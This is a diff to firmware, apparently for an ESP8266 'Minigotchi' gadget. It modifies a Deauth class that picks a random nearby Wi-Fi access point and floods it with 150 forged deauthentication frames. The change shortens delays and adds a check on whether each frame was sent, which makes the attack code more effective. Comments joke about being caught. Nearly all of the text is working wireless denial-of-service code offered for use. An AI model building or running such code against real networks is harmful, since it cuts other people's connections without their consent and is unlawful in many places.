@@ -72,7 +72,7 @@ void Deauth::select() {
         delay(500);
     }
 
-    delay(5000);
+    delay(1000);
 
     // stop and scan
     Minigotchi::monStop();
@@ -94,12 +94,14 @@ void Deauth::select() {
         Serial.println(" ");
         Display::cleanDisplayFace("('-')");
         Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
+        delay(1000);
     } else {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
         Serial.println(" ");
         Display::cleanDisplayFace("(;-;)");
         Display::attachSmallText("No access points found.");
+        delay(1000);
     }
 }
 
@@ -113,7 +115,7 @@ void Deauth::deauth() {
             Serial.println(" ");
             Display::cleanDisplayFace("(>-<)");
             Display::attachSmallText("Begin deauth-attack on AP...");
-            delay(5000);
+            delay(1000);
             // define the attack
             if (!running) {
                 start();
@@ -122,7 +124,7 @@ void Deauth::deauth() {
                 Serial.println(" ");
                 Display::cleanDisplayFace("('-')");
                 Display::attachSmallText(" Attack is already running.");
-                delay(5000);
+                delay(1000);
             }
         } else {
             // ok why did you modify the deauth function? i literally told you to not do that...
@@ -131,10 +133,10 @@ void Deauth::deauth() {
             Serial.println(" ");
             Display::cleanDisplayFace("(X-X)");
             Display::attachSmallText("No access point selected. Use select() first.");
-            delay(2500);
+            delay(1000);
             Display::cleanDisplayFace("('-')");
             Display::attachSmallText("Told you so!");
-            delay(2500);
+            delay(1000);
         }
     } else {
         // do nothing if deauthing is disabled
@@ -149,20 +151,24 @@ void Deauth::start() {
 
     // send the deauth 150 times(ur cooked if they find out)
     for (int i = 0; i < 150; ++i) {
-        wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthFrame), frameSize, 0);
+        bool sent = wifi_send_pkt_freedom(const_cast<uint8_t*>(deauthFrame), frameSize, 0) == 0;
         delay(102);
-        packets++;
 
-        // calculate packets per second
-        float pps = packets / (float)(millis() - startTime) * 1000;
+        if (sent) {
+            // calculate packets per second
+            packets++;
+            float pps = packets / (float)(millis() - startTime) * 1000;
 
-        // show pps
-        if (!isinf(pps)) {
-            Serial.print("(>-<) Packets per second: ");
-            Serial.print(pps);
-            Serial.println(" pkt/s");
-            Display::cleanDisplayFace("(>-<)");
-            Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s");
+            // show pps
+            if (!isinf(pps)) {
+                Serial.print("(>-<) Packets per second: ");
+                Serial.print(pps);
+                Serial.println(" pkt/s");
+                Display::cleanDisplayFace("(>-<)");
+                Display::attachSmallText("Packets per second: " + (String) pps + " pkt/s");
+            }
+        } else {
+            Serial.println("(X-X) Packet failed to send!");
         }
     }
 
